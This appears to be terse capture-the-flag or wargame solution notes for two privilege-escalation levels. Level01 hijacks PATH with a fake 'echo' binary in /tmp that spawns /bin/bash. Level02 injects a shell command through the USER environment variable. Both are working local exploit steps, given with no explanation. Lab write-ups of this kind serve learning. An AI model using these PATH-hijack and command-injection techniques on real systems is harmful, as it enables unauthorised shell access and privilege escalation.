## Level01
* PATH=/tmp/:$PATH
* create a echo.c in /tmp
```
echo.c
#include<stdio.h>
#include<stdlib.h>

int main(){
    system("/bin/bash");
}

cc echo.c -o echo
```

## Level02
* export USER=";/bin/bash;"

